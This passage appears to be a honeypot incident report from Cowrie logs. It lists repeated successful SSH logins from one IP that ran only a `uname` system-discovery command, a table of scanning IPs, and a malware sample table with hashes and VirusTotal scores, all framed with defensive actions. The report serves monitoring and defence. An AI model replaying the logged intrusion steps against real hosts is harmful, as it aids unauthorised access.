| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:53 |
| **Last Seen** | 2026-07-30 16:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:53:50` | `cowrie.session.connect` |
| `2026-07-30 16:53:50` | `cowrie.client.version` |
| `2026-07-30 16:53:50` | `cowrie.client.kex` |
| `2026-07-30 16:53:51` | `cowrie.login.success` |
| `2026-07-30 16:53:52` | `cowrie.session.params` |
| `2026-07-30 16:53:52` | `cowrie.command.input` |
| `2026-07-30 16:53:52` | `cowrie.log.closed` |
| `2026-07-30 16:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1436950288cc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:53 |
| **Last Seen** | 2026-07-30 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:53:56` | `cowrie.session.connect` |
| `2026-07-30 16:53:56` | `cowrie.client.version` |
| `2026-07-30 16:53:56` | `cowrie.client.kex` |
| `2026-07-30 16:53:57` | `cowrie.login.success` |
| `2026-07-30 16:53:57` | `cowrie.session.params` |
| `2026-07-30 16:53:57` | `cowrie.command.input` |
| `2026-07-30 16:53:58` | `cowrie.log.closed` |
| `2026-07-30 16:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0582b1f8d53a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:54 |
| **Last Seen** | 2026-07-30 16:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:54:02` | `cowrie.session.connect` |
| `2026-07-30 16:54:02` | `cowrie.client.version` |
| `2026-07-30 16:54:02` | `cowrie.client.kex` |
| `2026-07-30 16:54:03` | `cowrie.login.success` |
| `2026-07-30 16:54:04` | `cowrie.session.params` |
| `2026-07-30 16:54:04` | `cowrie.command.input` |
| `2026-07-30 16:54:05` | `cowrie.log.closed` |
| `2026-07-30 16:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-583391ee90ba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:54 |
| **Last Seen** | 2026-07-30 16:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:54:08` | `cowrie.session.connect` |
| `2026-07-30 16:54:08` | `cowrie.client.version` |
| `2026-07-30 16:54:08` | `cowrie.client.kex` |
| `2026-07-30 16:54:09` | `cowrie.login.success` |
| `2026-07-30 16:54:11` | `cowrie.session.params` |
| `2026-07-30 16:54:11` | `cowrie.command.input` |
| `2026-07-30 16:54:11` | `cowrie.log.closed` |
| `2026-07-30 16:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-070f6292d58f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:54 |
| **Last Seen** | 2026-07-30 16:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:54:14` | `cowrie.session.connect` |
| `2026-07-30 16:54:14` | `cowrie.client.version` |
| `2026-07-30 16:54:14` | `cowrie.client.kex` |
| `2026-07-30 16:54:15` | `cowrie.login.success` |
| `2026-07-30 16:54:16` | `cowrie.session.params` |
| `2026-07-30 16:54:16` | `cowrie.command.input` |
| `2026-07-30 16:54:16` | `cowrie.log.closed` |
| `2026-07-30 16:54:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a999dc17797

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:54 |
| **Last Seen** | 2026-07-30 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:54:19` | `cowrie.session.connect` |
| `2026-07-30 16:54:19` | `cowrie.client.version` |
| `2026-07-30 16:54:20` | `cowrie.client.kex` |
| `2026-07-30 16:54:20` | `cowrie.login.success` |
| `2026-07-30 16:54:21` | `cowrie.session.params` |
| `2026-07-30 16:54:21` | `cowrie.command.input` |
| `2026-07-30 16:54:21` | `cowrie.log.closed` |
| `2026-07-30 16:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aae5cc091dce

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:54 |
| **Last Seen** | 2026-07-30 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:54:25` | `cowrie.session.connect` |
| `2026-07-30 16:54:25` | `cowrie.client.version` |
| `2026-07-30 16:54:26` | `cowrie.client.kex` |
| `2026-07-30 16:54:26` | `cowrie.login.success` |
| `2026-07-30 16:54:27` | `cowrie.session.params` |
| `2026-07-30 16:54:27` | `cowrie.command.input` |
| `2026-07-30 16:54:27` | `cowrie.log.closed` |
| `2026-07-30 16:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-543e1774cc99

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:54 |
| **Last Seen** | 2026-07-30 16:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:54:31` | `cowrie.session.connect` |
| `2026-07-30 16:54:31` | `cowrie.client.version` |
| `2026-07-30 16:54:31` | `cowrie.client.kex` |
| `2026-07-30 16:54:32` | `cowrie.login.success` |
| `2026-07-30 16:54:33` | `cowrie.session.params` |
| `2026-07-30 16:54:33` | `cowrie.command.input` |
| `2026-07-30 16:54:33` | `cowrie.log.closed` |
| `2026-07-30 16:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-987e2745b47f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:54 |
| **Last Seen** | 2026-07-30 16:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:54:37` | `cowrie.session.connect` |
| `2026-07-30 16:54:37` | `cowrie.client.version` |
| `2026-07-30 16:54:37` | `cowrie.client.kex` |
| `2026-07-30 16:54:39` | `cowrie.login.success` |
| `2026-07-30 16:54:40` | `cowrie.session.params` |
| `2026-07-30 16:54:40` | `cowrie.command.input` |
| `2026-07-30 16:54:40` | `cowrie.log.closed` |
| `2026-07-30 16:54:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ee061d9a033

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:54 |
| **Last Seen** | 2026-07-30 16:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:54:43` | `cowrie.session.connect` |
| `2026-07-30 16:54:43` | `cowrie.client.version` |
| `2026-07-30 16:54:43` | `cowrie.client.kex` |
| `2026-07-30 16:54:44` | `cowrie.login.success` |
| `2026-07-30 16:54:46` | `cowrie.session.params` |
| `2026-07-30 16:54:46` | `cowrie.command.input` |
| `2026-07-30 16:54:46` | `cowrie.log.closed` |
| `2026-07-30 16:54:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18daee766c2d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:54 |
| **Last Seen** | 2026-07-30 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:54:49` | `cowrie.session.connect` |
| `2026-07-30 16:54:49` | `cowrie.client.version` |
| `2026-07-30 16:54:49` | `cowrie.client.kex` |
| `2026-07-30 16:54:49` | `cowrie.login.success` |
| `2026-07-30 16:54:50` | `cowrie.session.params` |
| `2026-07-30 16:54:50` | `cowrie.command.input` |
| `2026-07-30 16:54:50` | `cowrie.log.closed` |
| `2026-07-30 16:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55237ac04c84

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:54 |
| **Last Seen** | 2026-07-30 16:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:54:55` | `cowrie.session.connect` |
| `2026-07-30 16:54:55` | `cowrie.client.version` |
| `2026-07-30 16:54:55` | `cowrie.client.kex` |
| `2026-07-30 16:54:56` | `cowrie.login.success` |
| `2026-07-30 16:54:57` | `cowrie.session.params` |
| `2026-07-30 16:54:57` | `cowrie.command.input` |
| `2026-07-30 16:54:57` | `cowrie.log.closed` |
| `2026-07-30 16:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb6a46090807

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:55 |
| **Last Seen** | 2026-07-30 16:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:55:01` | `cowrie.session.connect` |
| `2026-07-30 16:55:01` | `cowrie.client.version` |
| `2026-07-30 16:55:01` | `cowrie.client.kex` |
| `2026-07-30 16:55:02` | `cowrie.login.success` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **56** | 2026-07-30 13:02 | 2026-07-30 16:51 | 49m | 0 | `T1592` | 🟠 MEDIUM |
| `217.60.195[.]127` | **15** | 2026-07-30 16:45 | 2026-07-30 16:54 | 10m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-30 13:09 | 2026-07-30 16:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `184.168.31[.]238` | **9** | 2026-07-30 15:05 | 2026-07-30 16:46 | 4m | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | **6** | 2026-07-30 15:59 | 2026-07-30 16:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]163` | **4** | 2026-07-30 15:01 | 2026-07-30 15:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.46.255[.]142` | **3** | 2026-07-30 16:28 | 2026-07-30 16:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | **3** | 2026-07-30 16:05 | 2026-07-30 16:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-07-30 13:13 | 2026-07-30 13:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.122.244[.]225` | **3** | 2026-07-30 13:34 | 2026-07-30 14:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]182` | **3** | 2026-07-30 14:58 | 2026-07-30 14:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]210` | **3** | 2026-07-30 14:58 | 2026-07-30 14:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]54` | **3** | 2026-07-30 14:59 | 2026-07-30 15:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]121` | **3** | 2026-07-30 14:40 | 2026-07-30 14:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-07-30 14:12 | 2026-07-30 14:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.75.216[.]134` | **2** | 2026-07-30 14:55 | 2026-07-30 14:57 | 2m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **2** | 2026-07-30 13:44 | 2026-07-30 14:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | **2** | 2026-07-30 13:38 | 2026-07-30 14:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **2** | 2026-07-30 13:33 | 2026-07-30 13:57 | 1m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]202` | **2** | 2026-07-30 16:32 | 2026-07-30 16:47 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]14` | **2** | 2026-07-30 15:51 | 2026-07-30 16:08 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.24[.]71` | 1 | 2026-07-30 16:08 | 2026-07-30 16:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.111.6[.]121` | 1 | 2026-07-30 13:51 | 2026-07-30 13:52 | 10s | 0 | `T1592` | 🟢 LOW |
| `114.33.12[.]13` | 1 | 2026-07-30 15:36 | 2026-07-30 15:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.134[.]186` | 1 | 2026-07-30 16:18 | 2026-07-30 16:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.66.63[.]189` | 1 | 2026-07-30 16:18 | 2026-07-30 16:18 | 12s | 0 | `T1592` | 🟢 LOW |
| `14.29.242[.]244` | 1 | 2026-07-30 13:38 | 2026-07-30 13:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `141.76.94[.]41` | 1 | 2026-07-30 16:54 | 2026-07-30 16:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `166.62.102[.]109` | 1 | 2026-07-30 14:31 | 2026-07-30 14:32 | 43s | 0 | `T1592` | 🟢 LOW |
| `176.10.203[.]54` | 1 | 2026-07-30 16:47 | 2026-07-30 16:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.61[.]221` | 1 | 2026-07-30 16:12 | 2026-07-30 16:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]123` | 1 | 2026-07-30 15:04 | 2026-07-30 15:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-07-30 14:01 | 2026-07-30 14:02 | 35s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]80` | 1 | 2026-07-30 16:28 | 2026-07-30 16:28 | 10s | 0 | `T1592` | 🟢 LOW |
| `31.173.29[.]136` | 1 | 2026-07-30 15:52 | 2026-07-30 15:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `42.51.41[.]137` | 1 | 2026-07-30 16:11 | 2026-07-30 16:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-07-30 16:02 | 2026-07-30 16:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.172.129[.]91` | 1 | 2026-07-30 14:48 | 2026-07-30 14:49 | 13s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]146` | 1 | 2026-07-30 15:38 | 2026-07-30 15:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.201.228[.]210` | 1 | 2026-07-30 12:55 | 2026-07-30 12:55 | 6s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]142` | 1 | 2026-07-30 13:15 | 2026-07-30 13:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]128` | 1 | 2026-07-30 12:59 | 2026-07-30 13:00 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]225` | 1 | 2026-07-30 15:08 | 2026-07-30 15:08 | 15s | 0 | `T1592` | 🟢 LOW |
| `8.134.124[.]8` | 1 | 2026-07-30 16:36 | 2026-07-30 16:37 | 31s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-07-30 16:12 | 2026-07-30 16:12 | 32s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | **1/74** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
